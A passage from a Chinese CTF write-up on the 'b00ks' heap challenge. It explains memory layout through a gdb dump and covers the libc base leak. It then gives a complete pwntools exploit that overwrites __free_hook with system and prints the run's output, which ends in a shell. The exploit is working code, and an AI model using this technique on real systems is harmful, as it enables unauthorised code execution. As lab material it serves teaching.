为了知道上述的payload是什么意思，所以我们使用kali进行查看：

（我的ubuntu查看内存地址详情为空，因此改用kali查看，内存地址不一样，但是内容大致相同）

```python
#warning：the address is in kali , not ubuntu
gdb-peda$ x/50gx 0x555555758280
0x555555758280:	0x0000000000000000	0x00000000000000d1
0x555555758290:	0x6161616161616161	0x6161616161616161 #padding_start->0x555555757690（ubuntu）
0x5555557582a0:	0x6161616161616161	0x6161616161616161
0x5555557582b0:	0x6161616161616161	0x6161616161616161
0x5555557582c0:	0x6161616161616161	0x6161616161616161
0x5555557582d0:	0x6161616161616161	0x6161616161616161
0x5555557582e0:	0x6161616161616161	0x6161616161616161
0x5555557582f0:	0x6161616161616161	0x6161616161616161 #padding_end->0x5555557576f0(ubuntu)
0x555555758300:	0x0000000000000001	0x0000555555758398 #fake_struct->0x555555757700(ubuntu)
0x555555758310:	0x0000555555758398	0x000000000000ffff #fake_struct->0x555555757700(ubuntu)
0x555555758320:	0x0000000000000000	0x0000000000000000
0x555555758330:	0x0000000000000000	0x0000000000000000
0x555555758340:	0x0000000000000000	0x0000000000000000
0x555555758350:	0x0000000000000000	0x0000000000000031
0x555555758360:	0x0000000000000001	0x0000555555758270 #book1结构体范围->0x555555757760(ubuntu)
0x555555758370:	0x0000555555758290	0x00000000000000c8 #book1结构体范围
0x555555758380:	0x0000000000000000	0x0000000000000031 #book1结构体范围
0x555555758390:	0x0000000000000002	0x00007ffff7dce010 #book2结构体范围
0x5555557583a0:	0x00007ffff7dac010	0x0000000000021000 #book2结构体范围
0x5555557583b0:	0x0000000000000000	0x000000000001fc51 #book2结构体范围
0x5555557583c0:	0x0000000000000000	0x0000000000000000
0x5555557583d0:	0x0000000000000000	0x0000000000000000
0x5555557583e0:	0x0000000000000000	0x0000000000000000
0x5555557583f0:	0x0000000000000000	0x0000000000000000
0x555555758400:	0x0000000000000000	0x0000000000000000
```

可以看到'a' * 0x70是从地址（ubuntu）0x555555757690开始填充直到地址0x555555757700开始填充payload，所以程序在执行功能“4”时会打印出地址0x00007ffff7dce010（book2_name的地址）

## 5、计算libc基地址，freehook、system、/bin/sh地址
既然我们得到了book2_name的地址就可以计算libc的基地址了

> 请注意，book2_name的内容在mmap扩展的内存空间里。
>

payload如下：

```python
log.info("Leaking mmap address...")
time.sleep(1)
p.sendline("4")
p.recvuntil("Name: ")
mmap_addr = u64(p.recv(6) + '\x00\x00')
```

通过调试我们可以得到 libc 和这个 mmap 分配的堆块之间的偏移是固定的，我们使用book2_name_addr计算偏移。

> book2_desc_addr - libc_addr = 0x00007ffff7dce010- 0x7ffff79e4000= 0x3EA010
>
> 即：libc_addr = book2_desc_addr - 0x3EA010
>

```python
log.info("Calculating libc's base")
time.sleep(1)
libc_addr = mmap_addr - 0x3EA010    # Change offset if it doesn't work!
#由于有elf文件并且关闭了ASLR，可以直接得到libc基址，也可以这样写
#libc_addr = 0x7ffff79e4000
time.sleep(1)
log.success("Libc's addr : 0x%x" % libc_addr)
```

在得到libc基地址之后就可以通过pwntools查找函数了，可以直接利用pwntools查找free_hook函数

> free_hook = libc.symbols["__free_hook"] + libc_addr
>

<font style="color:#1A1A1A;">调用 edit 功能，修改 book1(现在是伪造book1)的 description项，payload：</font>

```python
log.info("Searching __free_hook & system & /bin/sh in libc...")
free_hook = libc.symbols["__free_hook"] + libc_addr
system = libc.symbols["system"] + libc_addr
binsh = libc.search("/bin/sh").next() + libc_addr
time.sleep(1)
log.success("__free_hook address: 0x%x" % free_hook)
log.success("system address: 0x%x" % system)
log.success("/bin/sh address: 0x%x" % binsh)
time.sleep(1)
log.info("Changing book2's pointers...")
time.sleep(1)
payload2 = p64(binsh) + p64(free_hook)
edit(1, payload2)
'''
def edit(index, desc):
    p.sendline("3")
    p.recvuntil("Enter the book id you want to edit: ")
    p.sendline(str(index))
    p.recvuntil("Enter new book description: ")
    p.sendline(desc)
'''
p.recvuntil("> ")
time.sleep(1)
log.success("Book2's name and description's pointer has been changed!")
log.info("Book2's name --> /bin/sh")
log.info("Book2's desc --> free_hook")
log.info("Prepare to change book2's description, also known as __free_hook.")
time.sleep(1)
payload3 = p64(system)
edit(2,payload3)
p.recvuntil("> ")
time.sleep(1)
log.success("Now __free_hook's address is system's address!")
```

> payload2 = p64(binsh) + p64(free_hook)说明：
>
> <font style="background-color:transparent;">payload调用了edit函数，</font>这里修改的实际是 book2 的 name 以及 description 项~~**<font style="color:#F5222D;background-color:transparent;">实际上是再次修改 fake_book的 name 以及 description 项</font>**~~<font style="background-color:transparent;">为/bin/sh地址和free_hook的地址。</font>
>
> ~~<font style="background-color:transparent;">（因为已经泄露出book2的地址了，这里原</font>~~~~<font style="background-color:transparent;">fake_book的内容已经没有利用价值了</font>~~~~<font style="background-color:transparent;">）</font>~~
>
> payload3 = p64(system)
>
> 修改 book2 的 description 项为 system 函数地址(这里实际修改的是 __free_hook 的地址)。
>

**最后再free book2** ，在 free description时，实际调用的则是 system("/bin/sh")，得到shell。

大概的流程就是：**信息泄露–伪造结构–信息泄露–改写函数–取得shell**

# exp内容及执行详情
```python
from pwn import *
import time
context(log_level='DEBUG')

def create(name_len, name, desc_len, desc):
    p.sendline("1")
    p.recvuntil("Enter book name size: ")
    p.sendline(str(name_len))
    p.recvuntil("Enter book name (Max 32 chars): ")
    p.sendline(name)
    p.recvuntil("Enter book description size: ")
    p.sendline(str(desc_len))
    p.recvuntil("Enter book description: ")
    p.sendline(desc)

def delete(index):
    p.sendline("2")
    p.recvuntil("Enter the book id you want to delete: ")
    p.sendline(str(index))

def edit(index, desc):
    p.sendline("3")
    p.recvuntil("Enter the book id you want to edit: ")
    p.sendline(str(index))
    p.recvuntil("Enter new book description: ")
    p.sendline(desc)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
log.info("Loading program...")
p = process("./b00ks")
log.success("Load success!")
p.recvuntil("Enter author name: ")
p.sendline("a" * 32)
time.sleep(1)
log.info("Off-BY-NULL!")
time.sleep(1)
p.recvuntil("> ")
create(10, "book1_name", 200, "book1_desc")
create(0x21000, "book2_name", 0x21000, "book2_desc")
p.recvuntil("> ")
time.sleep(1)
log.info("Leaking book_1's address...")
time.sleep(1)
p.sendline("4")
p.recvuntil("Author: ")
p.recv(32)
book1_addr = u64(p.recv(6) + '\x00\x00')
log.success("Book1_addr : 0x%x" % book1_addr)
time.sleep(1)
log.info("Calculating book_2's address...")
time.sleep(1)
book2_addr = book1_addr + 0x30
log.success("Book2_addr : 0x%x" % book2_addr)
time.sleep(1)
p.recvuntil("> ")
time.sleep(1)
log.info("Prepare to construct a fake book...")
payload = 'a' * 0x70 + p64(1) + p64(book2_addr + 8) + p64(book2_addr + 8) + p64(0xffff)
edit(1, payload)
time.sleep(1)
log.success("Fake book constructed! And two pointers were set to book2.")
time.sleep(1)
p.recvuntil("> ")
log.info("Off-BY-NULL again! Now Book1 was set to the fake book.")
p.sendline("5")
p.recvuntil("Enter author name: ")
p.sendline('a' * 32)
p.recvuntil("> ")
time.sleep(1)
log.info("Leaking mmap address...")
time.sleep(1)
p.sendline("4")
p.recvuntil("Name: ")
mmap_addr = u64(p.recv(6) + '\x00\x00')
time.sleep(1)
log.success("Mmap address : 0x%x" % mmap_addr)
time.sleep(1)
p.recvuntil("> ")
time.sleep(1)
log.info("Calculating libc's base")
time.sleep(1)
libc_addr = 0x7ffff79e4000   # Change it if doesn't work!
time.sleep(1)
log.success("Libc's addr : 0x%x" % libc_addr)
time.sleep(1)
log.info("Searching __free_hook & system & /bin/sh in libc...")
free_hook = libc.symbols["__free_hook"] + libc_addr
system = libc.symbols["system"] + libc_addr
binsh = libc.search("/bin/sh").next() + libc_addr
time.sleep(1)
log.success("__free_hook address: 0x%x" % free_hook)
log.success("system address: 0x%x" % system)
log.success("/bin/sh address: 0x%x" % binsh)
time.sleep(1)
log.info("Changing book2's pointers...")
time.sleep(1)
payload2 = p64(binsh) + p64(free_hook)
edit(1, payload2)
p.recvuntil("> ")
time.sleep(1)
log.success("Book2's name and description's pointer has been changed!")
log.info("Book2's name --> /bin/sh")
log.info("Book2's desc --> free_hook")
log.info("Prepare to change book2's description, also known as __free_hook.")
time.sleep(1)
payload3 = p64(system)
edit(2,payload3)
p.recvuntil("> ")
time.sleep(1)
log.success("Now __free_hook's address is system's address!")
log.info("We just need to free book2.")
time.sleep(1)
delete(2)
log.info("Ready in 3 seconds...")
time.sleep(3)
log.success("PWN!!")

p.interactive()
```

```powershell
ubuntu@ubuntu:~/Desktop$ python end.py
[DEBUG] PLT 0x21020 realloc
[DEBUG] PLT 0x21060 __tls_get_addr
[DEBUG] PLT 0x210a0 memalign
[DEBUG] PLT 0x210b0 _dl_exception_create
[DEBUG] PLT 0x210f0 __tunable_get_val
[DEBUG] PLT 0x211a0 _dl_find_dso_for_object
[DEBUG] PLT 0x211e0 calloc
[DEBUG] PLT 0x212c0 malloc
[DEBUG] PLT 0x212c8 free
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loading program...
[+] Starting local process './b00ks' argv=['./b00ks'] : pid 7118
[+] Load success!
[DEBUG] Received 0x33 bytes:
    'Welcome to ASISCTF book library\n'
    'Enter author name: '
[DEBUG] Sent 0x21 bytes:
    'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
[*] Off-BY-NULL!
[DEBUG] Received 0x6f bytes:
    '\n'
    '1. Create a book\n'
    '2. Delete a book\n'
    '3. Edit a book\n'
    '4. Print book detail\n'
    '5. Change current author name\n'
    '6. Exit\n'
    '> '
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x17 bytes:
    '\n'
    'Enter book name size: '
[DEBUG] Sent 0x3 bytes:
    '10\n'
[DEBUG] Received 0x20 bytes:
    'Enter book name (Max 32 chars): '
[DEBUG] Sent 0xb bytes:
    'book1_name\n'
[DEBUG] Received 0x1e bytes:
    '\n'
    'Enter book description size: '
[DEBUG] Sent 0x4 bytes:
    '200\n'
[DEBUG] Received 0x18 bytes:
    'Enter book description: '
[DEBUG] Sent 0xb bytes:
    'book1_desc\n'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x86 bytes:
    '\n'
    '1. Create a book\n'
    '2. Delete a book\n'
    '3. Edit a book\n'
    '4. Print book detail\n'
    '5. Change current author name\n'
    '6. Exit\n'
    '> \n'
    'Enter book name size: '
[DEBUG] Sent 0x7 bytes:
    '135168\n'
[DEBUG] Received 0x20 bytes:
    'Enter book name (Max 32 chars): '
[DEBUG] Sent 0xb bytes:
    'book2_name\n'
[DEBUG] Received 0x1e bytes:
    '\n'
    'Enter book description size: '
[DEBUG] Sent 0x7 bytes:
    '135168\n'
[DEBUG] Received 0x18 bytes:
    'Enter book description: '
[DEBUG] Sent 0xb bytes:
    'book2_desc\n'
[DEBUG] Received 0x6f bytes:
    '\n'
    '1. Create a book\n'
    '2. Delete a book\n'
    '3. Edit a book\n'
    '4. Print book detail\n'
    '5. Change current author name\n'
    '6. Exit\n'
    '> '
[*] Leaking book_1's address...
[DEBUG] Sent 0x2 bytes:
    '4\n'
[DEBUG] Received 0x12b bytes:
    00000000  49 44 3a 20  31 0a 4e 61  6d 65 3a 20  62 6f 6f 6b  │ID: │1·Na│me: │book│
    00000010  31 5f 6e 61  6d 65 0a 44  65 73 63 72  69 70 74 69  │1_na│me·D│escr│ipti│
    00000020  6f 6e 3a 20  62 6f 6f 6b  31 5f 64 65  73 63 0a 41  │on: │book│1_de│sc·A│
    00000030  75 74 68 6f  72 3a 20 61  61 61 61 61  61 61 61 61  │utho│r: a│aaaa│aaaa│
    00000040  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    00000050  61 61 61 61  61 61 61 60  83 75 55 55  55 0a 49 44  │aaaa│aaa`│·uUU│U·ID│
    00000060  3a 20 32 0a  4e 61 6d 65  3a 20 62 6f  6f 6b 32 5f  │: 2·│Name│: bo│ok2_│
    00000070  6e 61 6d 65  0a 44 65 73  63 72 69 70  74 69 6f 6e  │name│·Des│crip│tion│
    00000080  3a 20 62 6f  6f 6b 32 5f  64 65 73 63  0a 41 75 74  │: bo│ok2_│desc│·Aut│
    00000090  68 6f 72 3a  20 61 61 61  61 61 61 61  61 61 61 61  │hor:│ aaa│aaaa│aaaa│
    000000a0  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    000000b0  61 61 61 61  61 60 83 75  55 55 55 0a  0a 31 2e 20  │aaaa│a`·u│UUU·│·1. │
    000000c0  43 72 65 61  74 65 20 61  20 62 6f 6f  6b 0a 32 2e  │Crea│te a│ boo│k·2.│
    000000d0  20 44 65 6c  65 74 65 20  61 20 62 6f  6f 6b 0a 33  │ Del│ete │a bo│ok·3│
    000000e0  2e 20 45 64  69 74 20 61  20 62 6f 6f  6b 0a 34 2e  │. Ed│it a│ boo│k·4.│
    000000f0  20 50 72 69  6e 74 20 62  6f 6f 6b 20  64 65 74 61  │ Pri│nt b│ook │deta│
    00000100  69 6c 0a 35  2e 20 43 68  61 6e 67 65  20 63 75 72  │il·5│. Ch│ange│ cur│
    00000110  72 65 6e 74  20 61 75 74  68 6f 72 20  6e 61 6d 65  │rent│ aut│hor │name│
    00000120  0a 36 2e 20  45 78 69 74  0a 3e 20                  │·6. │Exit│·> │
    0000012b
[+] Book1_addr : 0x555555758360
[*] Calculating book_2's address...
[+] Book2_addr : 0x555555758390
[*] Prepare to construct a fake book...
[DEBUG] Sent 0x2 bytes:
    '3\n'
[DEBUG] Received 0x24 bytes:
    'Enter the book id you want to edit: '
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x1c bytes:
    'Enter new book description: '
[DEBUG] Sent 0x91 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000070  01 00 00 00  00 00 00 00  98 83 75 55  55 55 00 00  │····│····│··uU│UU··│
    00000080  98 83 75 55  55 55 00 00  ff ff 00 00  00 00 00 00  │··uU│UU··│····│····│
    00000090  0a                                                  │·│
    00000091
[+] Fake book constructed! And two pointers were set to book2.
[DEBUG] Received 0x6f bytes:
    '\n'
    '1. Create a book\n'
    '2. Delete a book\n'
    '3. Edit a book\n'
    '4. Print book detail\n'
    '5. Change current author name\n'
    '6. Exit\n'
    '> '
[*] Off-BY-NULL again! Now Book1 was set to the fake book.
[DEBUG] Sent 0x2 bytes:
    '5\n'
[DEBUG] Received 0x13 bytes:
    'Enter author name: '
[DEBUG] Sent 0x21 bytes:
    'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
[DEBUG] Received 0x6f bytes:
    '\n'
    '1. Create a book\n'
    '2. Delete a book\n'
    '3. Edit a book\n'
    '4. Print book detail\n'
    '5. Change current author name\n'
    '6. Exit\n'
    '> '
[*] Leaking mmap address...
[DEBUG] Sent 0x2 bytes:
    '4\n'
[DEBUG] Received 0x10d bytes:
    00000000  49 44 3a 20  31 0a 4e 61  6d 65 3a 20  10 0a 44 65  │ID: │1·Na│me: │··De│
    00000010  73 63 72 69  70 74 69 6f  6e 3a 20 10  0a 41 75 74  │scri│ptio│n: ·│·Aut│
    00000020  68 6f 72 3a  20 61 61 61  61 61 61 61  61 61 61 61  │hor:│ aaa│aaaa│aaaa│
    00000030  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    00000040  61 61 61 61  61 0a 49 44  3a 20 32 0a  4e 61 6d 65  │aaaa│a·ID│: 2·│Name│
    00000050  3a 20 62 6f  6f 6b 32 5f  6e 61 6d 65  0a 44 65 73  │: bo│ok2_│name│·Des│
    00000060  63 72 69 70  74 69 6f 6e  3a 20 62 6f  6f 6b 32 5f  │crip│tion│: bo│ok2_│
    00000070  64 65 73 63  0a 41 75 74  68 6f 72 3a  20 61 61 61  │desc│·Aut│hor:│ aaa│
    00000080  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    00000090  61 61 61 61  61 61 61 61  61 61 61 61  61 0a 0a 31  │aaaa│aaaa│aaaa│a··1│
    000000a0  2e 20 43 72  65 61 74 65  20 61 20 62  6f 6f 6b 0a  │. Cr│eate│ a b│ook·│
    000000b0  32 2e 20 44  65 6c 65 74  65 20 61 20  62 6f 6f 6b  │2. D│elet│e a │book│
    000000c0  0a 33 2e 20  45 64 69 74  20 61 20 62  6f 6f 6b 0a  │·3. │Edit│ a b│ook·│
    000000d0  34 2e 20 50  72 69 6e 74  20 62 6f 6f  6b 20 64 65  │4. P│rint│ boo│k de│
    000000e0  74 61 69 6c  0a 35 2e 20  43 68 61 6e  67 65 20 63  │tail│·5. │Chan│ge c│
    000000f0  75 72 72 65  6e 74 20 61  75 74 68 6f  72 20 6e 61  │urre│nt a│utho│r na│
    00000100  6d 65 0a 36  2e 20 45 78  69 74 0a 3e  20           │me·6│. Ex│it·>│ │
    0000010d
[+] Mmap address : 0x637365440a10
[*] Calculating libc's base
[+] Libc's addr : 0x7ffff79e4000
[*] Searching __free_hook & system & /bin/sh in libc...
[+] __free_hook address: 0x7ffff7dd18e8
[+] system address: 0x7ffff7a334e0
[+] /bin/sh address: 0x7ffff7b980fa
[*] Changing book2's pointers...
[DEBUG] Sent 0x2 bytes:
    '3\n'
[DEBUG] Received 0x24 bytes:
    'Enter the book id you want to edit: '
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x1c bytes:
    'Enter new book description: '
[DEBUG] Sent 0x11 bytes:
    00000000  fa 80 b9 f7  ff 7f 00 00  e8 18 dd f7  ff 7f 00 00  │····│····│····│····│
    00000010  0a                                                  │·│
    00000011
[DEBUG] Received 0x6f bytes:
    '\n'
    '1. Create a book\n'
    '2. Delete a book\n'
    '3. Edit a book\n'
    '4. Print book detail\n'
    '5. Change current author name\n'
    '6. Exit\n'
    '> '
[+] Book2's name and description's pointer has been changed!
[*] Book2's name --> /bin/sh
[*] Book2's desc --> free_hook
[*] Prepare to change book2's description, also known as __free_hook.
[DEBUG] Sent 0x2 bytes:
    '3\n'
[DEBUG] Received 0x24 bytes:
    'Enter the book id you want to edit: '
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x1c bytes:
    'Enter new book description: '
[DEBUG] Sent 0x9 bytes:
    00000000  e0 34 a3 f7  ff 7f 00 00  0a                        │·4··│····│·│
    00000009
[DEBUG] Received 0x6f bytes:
    '\n'
    '1. Create a book\n'
    '2. Delete a book\n'
    '3. Edit a book\n'
    '4. Print book detail\n'
    '5. Change current author name\n'
    '6. Exit\n'
    '> '
[+] Now __free_hook's address is system's address!
[*] We just need to free book2.
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x26 bytes:
    'Enter the book id you want to delete: '
[DEBUG] Sent 0x2 bytes:
    '2\n'
[*] Ready in 3 seconds...
[+] PWN!!
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0x9d bytes:
    '1.py\tpwndbg-dev\t  Pygments-2.6.1.tar.gz\n'
    'b00ks\tpwndbg-dev.zip\t  unicorn-1.0.2rc3-py2.py3-none-manylinux1_x86_64.whl\n'
    'core\tpwntools-dev\n'
    'end.py\tpwntools-dev.zip\n'
1.py    pwndbg-dev      Pygments-2.6.1.tar.gz
b00ks    pwndbg-dev.zip      unicorn-1.0.2rc3-py2.py3-none-manylinux1_x86_64.whl
core    pwntools-dev
end.py    pwntools-dev.zip
$ whoami
[DEBUG] Sent 0x7 bytes:
    'whoami\n'
[DEBUG] Received 0x7 bytes:
    'ubuntu\n'
ubuntu
$  
```

